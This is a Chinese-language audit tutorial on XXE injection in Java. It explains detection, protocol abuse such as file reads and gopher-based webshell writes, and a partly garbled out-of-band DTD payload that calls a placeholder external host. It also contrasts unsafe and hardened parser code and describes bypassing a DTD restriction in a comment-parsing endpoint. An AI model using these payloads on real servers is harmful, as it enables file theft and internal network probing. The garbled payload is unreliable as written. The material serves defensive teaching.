xxe代码审计

xxe：xml外部实体注入

漏洞原理：提交恶意xml -> 服务器使用不安全的xml解析器解析 -> 读取服务器本地文件，内网端口，内网文件

前置知识：

一：从黑盒角度

xxe分为有回显和回显，有回显的利用方式就是利用http，file等协议去探测内网主机和端口，获取文件信息，无回显xxe采用数据外带进行利用

可能存在xxe的接口：

可能存在xxe的接口的请求包中的字段可能是content-tpye：app…./xml或者app…/x-www-form-urlencoded(php站点)，也可以手动添加X-Requested-With：XMLHttpRequest字段尝试能否解析，或者可以上传doc/xslx/ppt文件的功能点

在java中支持的协议：

file/netdoc（可以用来读取列目录文件，作用类似ls。file:///），http，gopher(适用于jdk1.8以下，写入webshell)，CDATA协议(如果读取的文本数据中包含<和&等特殊符号，一般是不解析会报错，但是这个协议会让xml解析器忽略这部分，这样就能读到)

采用以下方式将文本数据包含在CDATA部分中：

String data=“<[CDATA[文本数据]]>”;

准备一个payload，一个dtd文件

<?xml version=”1.0” encoding=”UTF-8”?>

<!ENTITY all “%start;%goodles;%end;”>

<?xml version=”1.0” encoding=”UTF-8”?>

<!ENTITY % and “] ]>”>

<!ENTITY % dtd SYSTEM “https://ip/1.dtd">

%dtd; ]>

<root>%all</root>

注意：但是存在局限性， 特殊符号会被去掉或者错位，无法读出

三：简单实例

不安全写法：

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder(); // 没做任何防护
Document doc = db.parse(input); // 直接解析用户输入

XML解析类没有进行设置就直接解析，正确的做法是生成工厂类后进行xxe漏洞的修复

安全写法：

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// 下面三行是修复 XXE 的固定代码
dbf.setFeature(“http://apache.org/xml/features/disallow-doctype-decl“, true);
dbf.setFeature(“http://xml.org/sax/features/external-general-entities“, false);
dbf.setFeature(“http://xml.org/sax/features/external-parameter-entities“, false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);

禁用dtd和外部实体

这里定义了一个内部类Comments，这个类是一个字符串数组类，再往后创建了一个HashMap用于绑定用户和用户评论，在getComments方法里面创建一个评论容器，得到键为用户对应的值，如果评论不为空就添加到Comments这个字符串数组类，然后添加之前的默认评论

再往下看到xml的解析方法，这里使用xmlInputFactory解析xml，下面有一个if，开启安全配置会禁止拉取dtd，这里动调是默认 不开启安全配置的

所以这里直接就是原生解析xml，存在xxe漏洞，这里即使开启安全配置进入if里面也可能被绕过，因为

它只限制了禁止拉去外部dtd，本地内联dtd是不受影响的，只禁止下载外部dtd文件，写在xml内部的dtd依旧可以完成漏洞，这里内部dtd+本地实体/参数实体都能行，参数实体常用于无回显xxe，经常利用其去加载外部dtd，这里能通过这个限制的原因是这个限制对参数实体的匹配较弱，可以利用参数实体绕过这个禁止加载外部dtd的限制

二：现代rest框架的xxe陷阱

在现代rest框架中是默认支持内容协商的，一个接口可能可以接受多种数据格式，比如json，xml，yaml等等，如果相关依赖可以自动开启xml解析器，并且开发者不知道的情况下这种是很有可能存在xxe的，因为默认配置的解析器不安全

这个数据包的content-type是支持json格式的，但是可以看到他有一个字段是x-Requested-With：XMLHttpRequest这里就可以看出他是支持xml的

改掉插入内部dtd＋本地实体就行，这里我想试一下根节点大小写敏感问题，看看黑盒时需不需要考虑这个问题，发现是大小写敏感的，看代码是规定了根节点的
